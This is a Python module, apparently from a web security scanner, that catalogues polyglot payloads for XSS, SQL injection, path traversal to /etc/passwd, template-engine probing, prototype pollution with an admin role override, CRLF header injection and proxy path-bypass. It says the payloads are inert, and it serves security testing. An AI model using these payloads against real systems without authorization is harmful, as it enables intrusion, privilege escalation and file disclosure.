"""Polyglot payloads — single strings exploitable across multiple
contexts (SQLi + XSS + LFI in one shot).

Why polyglot
------------
An attacker doesn't always know WHICH context their input lands in:
is it interpolated into SQL, echoed into HTML, used as a file path,
passed to eval()? A polyglot is a string crafted so that AT LEAST
ONE of its latent interpretations is exploitable in whatever context
the target happens to use it.

The gold standard
-----------------
The PortSwigger "Web Security Academy" polyglot:

  jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//\\x3csVg/<sVg/oNloAd=alert()//>\\x3e

Survives SQL single-quote escaping, HTML-attribute context, HTML text
context, JavaScript string context, href-attribute context, and XSS
via both inline handler and <svg> injection. This works by being
syntactically degenerate in every context — every `/*` opens a
comment in SQL+JS, every `//` ends the comment in JS, the alternating
case defeats keyword matchers, etc.

What this module ships
----------------------
A curated set of polyglots per-role:

  UNIVERSAL_REFLECT  — works against reflected-input (body/URL/header)
  SQL_PLUS_XSS       — exploits SQL sanitizer by making XSS the survivor
  LFI_RFI_UPLOAD     — universal file-path polyglot
  SSTI_CHAIN         — server-side template injection probe
  JSON_BODY_INJECT   — JSON body polyglots for API endpoints
  HEADER_POLYGLOT    — header injection that survives CRLF-stripping

All payloads are INERT — alert()-style only, never pop calc/shells
or move data. We flag intent, not damage.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List


@dataclass
class Polyglot:
    """One polyglot payload with context-coverage metadata."""
    name:    str
    payload: str
    contexts: List[str]        # which interpretations are exploitable
    notes:   str
    cwe_candidates: List[str]

    def to_dict(self) -> Dict:
        return {
            "name":     self.name,
            "payload":  self.payload,
            "contexts": self.contexts,
            "notes":    self.notes,
            "cwe_candidates": self.cwe_candidates,
        }


# ── The canonical polyglot library ────────────────────────────────


_UNIVERSAL = Polyglot(
    name="portswigger_universal_xss",
    payload=(
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )"
        "//\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    ),
    contexts=[
        "html-text", "html-attribute-double", "html-attribute-single",
        "html-attribute-unquoted", "href-attribute", "js-string-double",
        "js-string-single", "js-template-literal", "css-value",
    ],
    notes=(
        "The canonical polyglot from PortSwigger. Alternating case "
        "defeats keyword filters. Degenerate syntax in every context "
        "yields at least one executable interpretation."
    ),
    cwe_candidates=["CWE-79"],
)

_SQL_PLUS_XSS = Polyglot(
    name="sqli_xss_reflected",
    payload=(
        "'+/**/UNION/**/SELECT/**/'<script>alert(1)</script>'+--+-"
    ),
    contexts=[
        "sql-string-literal", "html-text-post-sql",
    ],
    notes=(
        "If sanitizer escapes SQL with addslashes() but then the result "
        "is echoed into HTML, the '<script>' survives. Works when "
        "the sanitizer is SQL-aware but not HTML-aware (or vice versa)."
    ),
    cwe_candidates=["CWE-89", "CWE-79"],
)

_LFI_RFI_UPLOAD = Polyglot(
    name="lfi_rfi_upload_filename",
    payload=(
        "../../../../etc/passwd%00.jpg"
    ),
    contexts=[
        "lfi-path-traversal", "upload-extension-bypass",
        "null-byte-truncation", "path-normalization",
    ],
    notes=(
        "Combines path-traversal + null-byte extension-check bypass. "
        "On PHP <5.3.4 + glibc, the %00 truncates the path so a server-"
        "side .jpg check passes while fopen() still sees /etc/passwd."
    ),
    cwe_candidates=["CWE-22", "CWE-434"],
)

_SSTI_CHAIN = Polyglot(
    name="ssti_engine_probe",
    payload=(
        "${{<%[%'\"}}%\\"
    ),
    contexts=[
        "twig", "jinja2", "freemarker", "velocity", "smarty", "handlebars",
    ],
    notes=(
        "Syntactically-illegal in MOST template engines — whichever "
        "engine the target uses, this yields a distinctive error "
        "message that identifies the engine. Once identified, send "
        "an engine-specific exploitation payload."
    ),
    cwe_candidates=["CWE-1336"],
)

_JSON_BODY = Polyglot(
    name="json_body_injection",
    payload=(
        '{"role":"admin","__proto__":{"admin":true},"id":1,"admin":true}'
    ),
    contexts=[
        "json-merge", "prototype-pollution", "role-override",
    ],
    notes=(
        "Prototype-pollution + role-override in a JSON body. Works "
        "against apps that do Object.assign(current, payload) or "
        "similar recursive-merge patterns without filtering __proto__."
    ),
    cwe_candidates=["CWE-1321"],
)

_HEADER = Polyglot(
    name="crlf_header_injection",
    payload=(
        "x\r\nSet-Cookie: amsw_probe=1\r\nX-Injected: 1"
    ),
    contexts=[
        "response-header-injection", "CRLF", "cookie-fixation",
    ],
    notes=(
        "If the target writes a user-controlled value into a response "
        "header without CRLF-stripping, this payload splits the "
        "response and injects a new header."
    ),
    cwe_candidates=["CWE-93"],
)

_PATH_BYPASS = Polyglot(
    name="path_normalization_bypass",
    payload=(
        "//admin/../admin/./settings?%2e%2e%2fbackdoor"
    ),
    contexts=[
        "path-normalization-disagreement", "reverse-proxy-bypass",
        "nginx-apache-parse-mismatch",
    ],
    notes=(
        "Exploits path-parse disagreements between the reverse proxy "
        "and the application. Different layers canonicalize `/./` and "
        "`//` differently; exploits where one layer authorizes based "
        "on the pre-normalized path but another serves based on the "
        "post-normalized path."
    ),
    cwe_candidates=["CWE-22", "CWE-287"],
)


ALL_POLYGLOTS: List[Polyglot] = [
    _UNIVERSAL,
    _SQL_PLUS_XSS,
    _LFI_RFI_UPLOAD,
    _SSTI_CHAIN,
    _JSON_BODY,
    _HEADER,
    _PATH_BYPASS,
]


# ── Public API ────────────────────────────────────────────────────


def polyglots_for_context(context_family: str) -> List[Polyglot]:
    """Return polyglots relevant to a named context family.

    context_family ∈ {"reflected", "sql", "lfi", "ssti", "json",
                      "header", "path"}

    Empty list if the family is unknown. Pass None or empty to get
    ALL polyglots.
    """
    if not context_family:
        return list(ALL_POLYGLOTS)
    fam = context_family.lower()
    picks: List[Polyglot] = []
    for p in ALL_POLYGLOTS:
        if any(fam in c for c in p.contexts):
            picks.append(p)
        elif fam == "reflected" and p.name == "portswigger_universal_xss":
            picks.append(p)
        elif fam == "sql" and "sql" in p.name:
            picks.append(p)
        elif fam == "lfi" and ("lfi" in p.name or "path" in p.name):
            picks.append(p)
        elif fam == "ssti" and p.name == "ssti_engine_probe":
            picks.append(p)
        elif fam == "json" and "json" in p.name:
            picks.append(p)
        elif fam == "header" and "crlf" in p.name:
            picks.append(p)
        elif fam == "path" and "path" in p.name:
            picks.append(p)
    return picks


def all_polyglots() -> List[Polyglot]:
    return list(ALL_POLYGLOTS)
